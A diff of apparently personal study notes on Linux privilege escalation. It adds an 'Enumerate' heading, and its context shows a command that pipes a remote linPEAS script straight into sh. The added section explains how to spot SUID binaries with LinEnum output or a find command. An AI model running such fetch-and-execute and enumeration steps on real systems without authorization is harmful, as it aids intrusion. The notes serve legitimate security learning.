@@ -1,3 +1,6 @@
+
+# Enumerate
+
 On Linux ideally we would be looking for opportunities to gain access to a user account. 
 SSH keys stored at `/home/<user>/.ssh` 
 
@@ -13,7 +16,7 @@ first ssh into ip THEN
 curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
 ```
 
-# LinEnum
+## LinEnum
 
 [LinEnum GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
 
@@ -34,6 +37,24 @@ Start a server from the directory that contains LinEnum.sh
 
 
 # Exploiting SUID Files
+
+SUID files: Look like
+`-rwsr-xr-x
+Notice the ***'S'***
+
+ctrl+F to find this part of your LinEnum scan
+```
+[-] SUID files:
+-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount
+-rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user5/script
+-rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user3/shell
+```
+OR
+Use this command to search the system for SUID/GUID files:
+`find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files
+
+---
+# Exploiting a writable /etc/passwd
 
 
 
